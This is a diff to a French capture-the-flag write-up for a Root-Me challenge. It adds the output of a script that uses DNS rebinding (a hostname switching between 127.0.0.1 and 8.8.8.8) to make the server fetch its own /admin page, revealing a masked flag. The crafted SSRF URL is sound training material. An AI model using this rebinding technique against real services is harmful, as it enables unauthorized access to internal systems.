@@ -22,7 +22,12 @@ On obtient l'url suivante : `7f000001.08080808.rbndr.us`.
 
 En effectuant une requête sur le site du challenge ou trouve que l'url pour faire une requête est : `http://challenge01.root-me.org:54022/grab?url=7f000001.08080808.rbndr.us:54022/admin`.
 
-Puis [ce script](./Scripts/netfilter.py) va envoyer des requêtes en boucles jusqu'à obtenir le code source de la page admin.
+Puis [ce script](./Scripts/netfilter.py) va envoyer des requêtes en boucles jusqu'à obtenir le code source de la page admin :
+
+```bash
+$ python3 netfilter.py           
+b'\n        <html>\n            <head>\n                <title>Admin page</title>\n                <link rel="stylesheet" href="/static/bootstrap.min.css">\n            </head>\n            <body style="background:pink">\n                <br/>\n                <h1 class="d-flex justify-content-center">Well done!</h1>\n                <h3 class="d-flex justify-content-center">Have a cookie. Admins love cookies.</h1>\n                <h6 class="d-flex justify-content-center">Flag: [coucou toi le flag est caché]\n</h6>\n                <div class="d-flex justify-content-center">\n                    <img src="/static/cookie.png"/>\n                </div>\n            </body>\n        </html>\n    '
+```
 
 🌞 **Proposer une version du code qui n'est pas vulnérable**
 
